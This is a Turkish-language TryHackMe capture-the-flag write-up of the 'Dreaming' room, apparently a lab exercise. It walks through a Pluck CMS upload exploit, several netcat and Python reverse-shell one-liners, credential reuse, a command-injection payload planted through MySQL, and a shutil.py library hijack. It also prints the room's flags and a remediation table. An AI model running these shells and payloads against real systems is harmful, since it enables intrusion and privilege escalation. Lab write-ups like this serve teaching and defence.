# 💤 Dreaming — TryHackMe Writeup

![Zorluk](https://img.shields.io/badge/Zorluk-Kolay-brightgreen)
![Kategori](https://img.shields.io/badge/Kategori-Web%20|%20CMS%20|%20Lateral%20Movement%20|%20Python%20Library%20Hijacking-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Yazar:** Miraç Akkuş (LatenT)  
> **Tarih:** Mayıs 2026  
> **Oda:** [Dreaming](https://tryhackme.com/room/dreaming)

---

## 📋 Olay Özeti

Bu write-up, **Dreaming** makinesinin tam sömürülmesini belgelemektedir. Pluck CMS file upload RCE ile başlayan, ardından düz metin parolalarla lateral movement, MySQL command injection ile death kullanıcısına yükselme ve son olarak Python kütüphane hijacking (shutil.py) ile morpheus/root yetkisine ulaşan çok aşamalı bir zincir.

---

## 🛠️ Araçlar

| Araç | Amaç |
|------|------|
| `nmap` | Ağ keşfi |
| `ffuf` / `gobuster` | Dizin fuzzing |
| `searchsploit` | Exploit arama |
| `python3` | Exploit çalıştırma |
| `nc` | Ters kabuk |
| `mysql` | Veritabanı manipülasyonu |

---

## 🔍 Aşama 1: Keşif

```bash
nmap -sV -sC -T4 <IP>
```

| Port | Servis |
|------|--------|
| 22 | SSH |
| 80 | Apache |

```bash
ffuf -u http://<IP>/FUZZ -w raft-large-directories.txt
```

Bulunan: `/app` — dizin listeleme aktif.

İçinde: `pluck-4.7.13` — Pluck CMS.

---

## 🌐 Aşama 2: Pluck CMS RCE

### Admin Panel

`http://<IP>/app/pluck-4.7.13/admin`

Giriş: `password` (evet, gerçekten bu kadar basit)

### Exploit

```bash
searchsploit -m php/webapps/49909.py
python3 49909.py <IP> 80 password /app/pluck-4.7.13/
```

Shell upload edildi: `/app/pluck-4.7.13/files/shell.php`

### Ters Kabuk

```bash
nc -lvnp 9001

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> 9001 >/tmp/f
```

**Kabuk:** `www-data`

---

## 🏴 Aşama 3: Lucien Flag'i

`/opt` altında `test.py` bulundu:

```python
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"
```

SSH girişi:

```bash
ssh lucien@<IP>
# Password: HeyLucien#@1999!
```

```bash
cat /home/lucien/lucien_flag.txt
```

**Lucien Flag'i:** `THM{TH3_L1BR4R14N}`

---

## 🚀 Aşama 4: Death Flag'i

### Sudo Analizi

```bash
sudo -l
```

```
(lucien) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

### Script Analizi

`/opt/getDreams.py` içinde:

```python
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

**Zafiyet:** `subprocess.check_output(command, shell=True)` — command injection.

### MySQL Erişimi

`.bash_history`'den parola: `lucien42DBPASSWORD`

```bash
mysql -u lucien -plucien42DBPASSWORD
use library;
```

### Command Injection

```sql
INSERT INTO dreams (dreamer, dream) VALUES ("evil", "$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> 9002 >/tmp/f)");
```

Tetikleme:

```bash
nc -lvnp 9002
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

**Kabuk:** `death`

```bash
cat /home/death/death_flag.txt
```

**Death Flag'i:** `THM{1M_TH3R3_4_TH3M}`

---

## 🐍 Aşama 5: Morpheus Flag'i (Python Library Hijacking)

### Death ile Keşif

```bash
find /usr/ -type f -writable 2>/dev/null
```

**Bulgu:** `/usr/lib/python3.8/shutil.py` — death grubuna yazılabilir!

### restore.py Analizi

```bash
cat /home/morpheus/restore.py
```

`shutil` import ediyor. Cronjob ile düzenli çalışıyor.

### shutil.py Hijacking

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",9003));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /usr/lib/python3.8/shutil.py
```

Dinleyici:

```bash
nc -lvnp 9003
```

Birkaç dakika bekleyin (cronjob tetiklemesi).

**Kabuk:** `morpheus`

```bash
cat /home/morpheus/morpheus_flag.txt
```

**Morpheus Flag'i:** `THM{DR34MS_5H4P3_TH3_W0RLD}`

---

## 🗺️ Saldırı Yolu

```
[Pluck CMS Admin]
    │
    ▼
[File Upload RCE (password)]
    │
    ▼
[www-data shell]
    │
    ▼
[/opt/test.py → lucien parolası]
    │
    ▼
[SSH: lucien]
    │
    ▼
[Lucien Flag]
    │
    ▼
[sudo -l: getDreams.py as death]
    │
    ▼
[MySQL command injection]
    │
    ▼
[death shell]
    │
    ▼
[Death Flag]
    │
    ▼
[writable /usr/lib/python3.8/shutil.py]
    │
    ▼
[shutil.py hijacking]
    │
    ▼
[cronjob tetikleme]
    │
    ▼
[morpheus shell]
    │
    ▼
[Morpheus Flag]
```

---

## 🛡️ Çözümler

| # | Zafiyet | Çözüm |
|---|---------|-------|
| 1 | Varsayılan parola (`password`) | Güçlü parola politikası; MFA |
| 2 | Pluck 4.7.13 file upload RCE | Güncelleme; WAF |
| 3 | Düz metin parolalar (test.py, .bash_history) | Hash depolama; history temizleme |
| 4 | Command injection (subprocess shell=True) | Parametrik sorgular; shell=False |
| 5 | Yazılabilir Python kütüphanesi | Dosya izinleri; read-only mount |

---

## 🎓 Çıkarımlar

1. **Varsayılan parolalar hâlâ işe yarıyor** — `password` ile admin paneline girmek 2026'da bile mümkün
2. **Düz metin parola avcılığı** — `/opt`, `.bash_history`, log'lar altın madeni
3. **`subprocess(shell=True)` ölümcül** — Her zaman `shell=False` kullan; parametrik yap
4. **Python library hijacking** — Yazılabilir `/usr/lib/python3.x/*.py` dosyaları cronjob'larla birleşince kritik
5. **MySQL injection → RCE** — Veritabanına yazılan veri, shell'e yansıtılıyorsa injection zinciri oluşur

---

## 🚩 Flag'ler

| Flag | Kullanıcı | Değer |
|------|-----------|-------|
| Lucien | `lucien` | `THM{TH3_L1BR4R14N}` |
| Death | `death` | `THM{1M_TH3R3_4_TH3M}` |
| Morpheus | `morpheus` | `THM{DR34MS_5H4P3_TH3_W0RLD}` |

---

**Yazan:** Lat (latent) 
**Tarih:** Mayıs 2026
